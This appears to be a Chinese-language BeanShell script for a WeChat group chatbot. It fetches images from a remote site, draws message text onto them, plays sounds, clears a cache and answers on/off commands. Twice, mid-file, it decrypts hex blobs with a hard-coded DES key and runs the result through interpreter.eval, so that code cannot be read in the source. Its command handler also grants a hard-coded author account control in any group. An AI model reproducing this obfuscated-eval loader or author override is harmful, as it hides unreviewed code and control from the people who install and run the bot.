public static HashMap 地图=new HashMap();
public class 检查
{
	String 名称;
	JSONArray 数组;
	JSONArray 数据=new JSONArray();
	long 时间;
	int 数量;
}
int 选择=0;
public void 存(String a,String b,String c){
putString(a,b,c);
}
public String 取(String a,String b){
return getString(a,b,"");
}
boolean flag=false;
public List list=new ArrayList();
public static void DetectPic(){
try{
File dir = new File(JavaPath+"/图片/");
if(!dir.exists()){
 dir.mkdirs();
Downloadpic(-1);
}else{
for(int i=0;i<10;i++){
String fi=JavaPath+"/图片/图片"+i+".jpg";
File di = new File(fi);
if(!di.exists()){
Downloadpic(i);
if(list.contains(fi)){
list.remove(fi);
}}}
}
}catch(Exception e){
e.printStackTrace();
}
}

public static void Downloadpic(int j){
String url="https://t.mwm.moe/ycy";
if(j==-1){
flag=true;
Toast("正在缓存,请稍后");
for(int i=0;i<15;i++){
try {
xz(url,JavaPath+"/图片/图片"+i+".jpg");
} catch (Exception e) {
e.printStackTrace();
}}
flag=false;
Toast("初始化成功");
}else{
try {
xz(url,JavaPath+"/图片/图片"+j+".jpg");
} catch (Exception e) {
e.printStackTrace();
}}
}

public static void getData(String qun,String text){
if(flag){sendMsg(qun,text);Toast("图片初始化，自动切换文字发送");return;}
int num=(int)(Math.random()*10);
String fi=JavaPath+"/图片/图片"+num+".jpg";

while(!new File(fi).exists()){
DetectPic();
num=(int)(Math.random()*10);
fi=JavaPath+"/图片/图片"+num+".jpg";
}
if(!list.contains(fi)){
sendPic(qun,MakeTextPhoto(text,num));
delAllFile(new File(fi),1);
list.add(fi);
DetectPic();
}else{
Toast("太快了,请慢点");
getData(qun,text);
}
}

public static String fetchRedirectUrl(String url){
        try {
            // 创建一个URL对象
            URL imageUrl=new URL(url);
            // 打开一个HTTP连接
            HttpURLConnection connection=(HttpURLConnection) imageUrl.openConnection();
            // 设置请求方法为GET
            connection.setRequestMethod("GET");
            String redirectUrl=connection.getHeaderField("Location");
            // 关闭连接
            connection.disconnect();
            // 返回重定向链接
            return redirectUrl;
        } catch (Exception e) {
            // 处理异常
            e.printStackTrace();
            // 返回空字符串
            return "";
        }
}
public static void xz(String url,String filepath) throws Exception
    {
        InputStream input = null;
        try {
            URL urlsssss = new URL(url);
            HttpURLConnection urlConn = (HttpURLConnection) urlsssss.openConnection();
            input = urlConn.getInputStream();
            byte[] bs = new byte[1024];
            int len;
            FileOutputStream out = new FileOutputStream(filepath, false);
            while((len = input.read(bs)) != -1)
            {
                out.write(bs, 0, len);
            }
            out.close();
            input.close();

        } catch (IOException e) {
            return;
        }
        finally {
            try {
                input.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return;
    }
import java.security.SecureRandom;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;
import java.util.Base64;
import java.net.URLEncoder;
import java.net.URLDecoder;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import javax.script.ScriptException;
public final class EncryptUtil
{
    private final static String DES = "DES";
    public static String decrypt(String src, String key)
    {
        try
        {
            return new String(decrypt(hex2byte(src.getBytes()), key.getBytes()));
        }
        catch (Exception e)
        {}
        return null;
    }
    public static String encrypt(String src, String key)
    {
        try
        {
            return byte2hex(encrypt(src.getBytes(), key.getBytes()));
        }
        catch (Exception e)
        {}
        return null;
    }
    private static byte[] decrypt(byte[] src, byte[] key) throws Exception
    {
        SecureRandom sr = new SecureRandom();
        DESKeySpec dks = new DESKeySpec(key);
        SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(DES);
        SecretKey securekey = keyFactory.generateSecret(dks);
        Cipher cipher = Cipher.getInstance(DES);
        cipher.init(Cipher.DECRYPT_MODE, securekey, sr);
        return cipher.doFinal(src);
    }
    private static byte[] hex2byte(byte[] b)
    {
        if((b.length % 2) != 0) throw new IllegalArgumentException("长度不是偶数");
        byte[] b2 = new byte[b.length / 2];
        for(int n = 0; n < b.length; n += 2)
        {
            String item = new String(b, n, 2);
            b2[n / 2] = (byte) Integer.parseInt(item, 16);
        }
        return b2;
    }
    private static String byte2hex(byte[] b)
    {
        String hs = "";
        String stmp = "";
        for(int n = 0; n < b.length; n++)
        {
            stmp = (java.lang.Integer.toHexString(b[n] & 0XFF));
            if(stmp.length() == 1) hs = hs + "0" + stmp;
            else hs = hs + stmp;
        }
        return hs.toUpperCase();
    }
}

this.interpreter.eval(EncryptUtil.decrypt("9C15A243E4CB5EBE8E8D2738AD5C5EE61A7B68D09CFD5533C1B2CDCCCF268B5CA39AC462AA2C98501F63B054239E8DF4D919F0D0796ADDBDEAA338D80ABD583F1A07DE5DE0BB4432397E947D8B8D1B3A31F2E0156239C235","SecretKey"),"eval stream");

import android.media.MediaPlayer;
private MediaPlayer mediaPlayer;

    public void 提示音(String filePath) {
        if (mediaPlayer != null) {
            // 如果MediaPlayer正在播放，先停止并释放资源
            mediaPlayer.release();
        }

        // 创建新的MediaPlayer对象
        mediaPlayer = new MediaPlayer();
        try {
            File file = new File(filePath);
            mediaPlayer.setDataSource(file.getPath());
            mediaPlayer.setLooping(false);
            mediaPlayer.prepare(); // 可以使用prepareAsync进行异步准备
            mediaPlayer.start();
        } catch (Exception e) {
            e.printStackTrace();
            // 发生异常时，释放MediaPlayer资源
            mediaPlayer.pause();
            mediaPlayer.release();
            mediaPlayer = null;
        }
    }

public void release() {
        if (mediaPlayer != null) {
        	mediaPlayer.pause();
            mediaPlayer.release();
            mediaPlayer = null;
        }
}

this.interpreter.eval(EncryptUtil.decrypt("F2D1EB21A9DB1E2E41DB73BACC07FCE089019C504F9227D12F23F29B94100176E817A88B66C89A9B7B4B4D52A556664189019C504F9227D14D707CC14B0BCF2E3234EDD8973424195DE71F95DA7545A950FE72678C27443F2825557F4AAF2CDA104C857DDA5A5B2F99BCFE38ED9C5DB29BAD2EBD4BE0F8409D304B6928C2D67232990F04E581AABC0A8656589D2ECDB5B1A013693705E5027CF3597D085C436F0AD9865A4F44F2128193CC37D05D4ECF4467FFCB1512F3661B76496F3EF710E2C1B35055566E6EBF","SecretKey"),"eval stream");

import android.graphics.*;
public static String MakeTextPhoto(String text,int num){
String textface=JavaPath+"/云上升/字体.ttf";
Object typeface;
try{typeface=Typeface.createFromFile(textface);}
catch(e){typeface=Typeface.DEFAULT_BOLD;}
text=text.replace("[]","");
String[] word=text.split("\n");

float textsize=70.0f;
float padding=60.0f;

Paint paint=new Paint(Paint.ANTI_ALIAS_FLAG | Paint.DITHER_FLAG);


paint.setTypeface(typeface);
paint.setTextSize(textsize);
Bitmap mybitmap;
mybitmap=BitmapFactory.decodeFile(JavaPath+"/图片/图片"+num+".jpg");
float text_width=0;
float average_width=0;
float text_height=0; 
String newword="";
for(String line:word){
average_width +=paint.measureText(line);}
average_width=average_width/word.length;

for(String line:word){
float width=paint.measureText(line);
if(width-average_width>700){
int rr=Math.ceil(width/average_width);
int cut=Math.ceil(line.length()/rr);

line=splitString(line,cut);
for(String newl:line.split("\n")){
width=paint.measureText(newl);
if(text_width<width) text_width=width;}}
if(text_width<width) text_width=width;
newword+=line+"\n";}
word=newword.split("\n");

int width=(int)(text_width + padding * 2f);
int heigth=(int)((textsize+8) * word.length+ padding * 2f)-8;
Bitmap original=Bitmap.createBitmap(width, heigth, Bitmap.Config.ARGB_8888);


Canvas canvas=new Canvas(original);
Matrix matrix = new Matrix();

float i=(float)width/(float)mybitmap.getWidth();
float b=(float)heigth/(float)mybitmap.getHeight();
if(i>b) b=i;
//if(i<b) b=i;
matrix.postScale(b,b); //长和宽放大缩小的比例
Bitmap resizeBmp = Bitmap.createBitmap(mybitmap,0,0,mybitmap.getWidth(),mybitmap.getHeight(),matrix,true);
canvas.drawBitmap(resizeBmp, (original.getWidth()-resizeBmp.getWidth())/2, (original.getHeight()-resizeBmp.getHeight())/2, paint);
canvas.drawColor(Color.parseColor("#3AFFFFFF"));//白色半透明遮罩

paint.setColor(getColor("黑色"));
//字体颜色可填：红色、黑色、蓝色、蓝绿、白灰、灰色、绿色、深灰、洋红、透明、白色、黄色、随机

float yoffset=textsize+padding;
for(String line:word){
canvas.drawText(line, padding, yoffset, paint);
yoffset += textsize+8;}
String path=JavaPath+"/缓存/"+canvas+".png";
File end=new File(path);
if(!end.exists()) end.getParentFile().mkdirs();
FileOutputStream out=new FileOutputStream(end);
original.compress(Bitmap.CompressFormat.JPEG, 100, out);
out.close();
return path;
}
private static String randomColor(int len){
	try{
		StringBuffer result=new StringBuffer();
			for (int i=0; i < len; i++){
				result.append(Integer.toHexString(new Random().nextInt(16)));
			}
			return result.toString().toUpperCase();
		}catch (Exception e){
			return "00CCCC";
		}
	};
public static int getColor(String color)
{
	switch(color)
	{
		case "红色":
			return Color.RED;
		case "黑色":
			return Color.BLACK;
		case "蓝色":
			return Color.BLUE;
		case "蓝绿":
			return Color.CYAN;
		case "白灰":
			return Color.LTGRAY;
		case "灰色":
			return Color.GRAY;
		case "绿色":
			return Color.GREEN;
		case "深灰":
			return Color.DKGRAY;
		case "洋红":
			return Color.MAGENTA;
		case "透明":
			return Color.TRANSPARENT;
		case "白色":
			return Color.WHITE;
		case "黄色":
			return Color.YELLOW;
		case "随机":
			return Color.parseColor("#"+randomColor(6));
		default:
			return Color.parseColor("#"+color);
	}
};
public Object ParseColor(String color,Object normal)
{
Object parsecolor;
try{
if(color.contains("随机")) parsecolor=Color.parseColor(randomColor(6));
else parsecolor=Color.parseColor(color);
}
catch(e){parsecolor=normal;}
return parsecolor;
}
public String splitString(String content, int len)
{
	String tmp="";
	if(len > 0){
	if(content.length() > len){
	int rows=Math.ceil(content.length() / len);
	for (int i=0; i < rows; i++){
	if(i == rows - 1){
	tmp += content.substring(i * len);}else{
	tmp += content.substring(i * len, i * len + len) + "\n ";}}}else{
	tmp=content;}}return tmp;
}

//获取目录大小
import java.text.DecimalFormat;
public static String getFormattedSize(File folder){
if (folder == null || !folder.exists()) {
return "文件夹不存在或为空";
}
long sizeInBytes=getFolderSize(folder);
double sizeInKB=sizeInBytes / 1024.0; // 文件夹大小（KB）
DecimalFormat decimalFormat=new DecimalFormat("#.###");
if (sizeInKB < 1024) {
return decimalFormat.format(sizeInKB) + "KB";
} else if (sizeInKB < 1024 * 1024) {
double sizeInMB=sizeInKB / 1024.0; // 文件夹大小（MB）
return decimalFormat.format(sizeInMB) + "MB";
} else {
double sizeInGB=sizeInKB / (1024.0 * 1024.0); // 文件夹大小（GB）
return decimalFormat.format(sizeInGB) + "GB";
}}
public static long getFolderSize(File folder){
long size=0;
File[] files=folder.listFiles();
if (files != null) {
for (File file : files) {
if (file.isFile()) {
size += file.length();
} else if (file.isDirectory()) {
size += getFolderSize(file);
}
}
}
return size;
}
//加载删除缓存
public static void delAllFile(File directory,int type){
if(!directory.exists()) return;
String text="删除";
    if (!directory.isDirectory()){
    text+="\n文件"+directory.getAbsolutePath();
        directory.delete();
    } else{
        File [] files=directory.listFiles();

        // 空文件夹
        if (type==0&&files.length==0){
           directory.delete();
          text+="\n空文件夹"+directory.getAbsolutePath();
            return;
        }

        // 删除子文件夹和子文件
        for (File file : files){
            if (file.isDirectory()){
                delAllFile(file,type);
            } else {
                file.delete();
                text+="\n文件"+file.getAbsolutePath();
            }
        }

        // 删除文件夹本身
        if(type==0){
        directory.delete();
      text+="\n文件夹" + directory.getAbsolutePath();
      }
    }
}
delAllFile(new File(JavaPath+"/缓存"),0);

public static String u解(String unicode) {
StringBuffer string = new StringBuffer();
String[] hex = unicode.split("\\\\u");
        for (int i = 0; i < hex.length; i++) {

            try {
                if(hex[i].length()>=4){
                    String chinese = hex[i].substring(0, 4);
                    try {
                        int chr = Integer.parseInt(chinese, 16);
                        boolean isChinese = isChinese((char) chr);
                            string.append((char) chr);
                            String behindString = hex[i].substring(4);
                            string.append(behindString);
                    } catch (NumberFormatException e1) {
                        string.append(hex[i]);
                    }

                }else{
                    string.append(hex[i]);
                }
            } catch (NumberFormatException e) {
                string.append(hex[i]);
            }
        }

return string.toString();
}
public static boolean isChinese(char c) {
        Character.UnicodeBlock ub = Character.UnicodeBlock.of(c);
        if (ub == Character.UnicodeBlock.CJK_UNIFIED_IDEOGRAPHS
                || ub == Character.UnicodeBlock.CJK_COMPATIBILITY_IDEOGRAPHS
                || ub == Character.UnicodeBlock.CJK_UNIFIED_IDEOGRAPHS_EXTENSION_A
                || ub == Character.UnicodeBlock.GENERAL_PUNCTUATION
                || ub == Character.UnicodeBlock.CJK_SYMBOLS_AND_PUNCTUATION
                || ub == Character.UnicodeBlock.HALFWIDTH_AND_FULLWIDTH_FORMS) {
            return true;
        }
        return false;
}

public void onMsg(Object data){
String text=data.content;
String qun=data.talker;
String wxid=data.sendTalker;
if(data.isText()){
if(wxid.equals(AuthorWxid)||!qun.equals(WhiteList)){
if(wxid.equals(AuthorWxid)||mWxid.equals(wxid)){
if(text.equals("开机")||text.equals("开启")){
	if("1".equals(getString(qun,"开关",""))){
	sendMsg(qun,"已经开机了");
	}else{
	putString(qun,"开关","1");
	sendMsg(qun,"开机成功");
	}
}
if(text.equals("关机")||text.equals("关闭")){
	if("1".equals(getString(qun,"开关",""))){
	putString(qun,"开关",null);
	sendMsg(qun,"关机成功");
	}
}
if(text.equals("开关设置")){
	开关设置(qun);
	recallMsg(data.values);
}
}
}
if("1".equals(getString(qun,"开关",""))){菜单(data);}
}
if("1".equals(getString(qun,"开关",""))){进群(data);}
}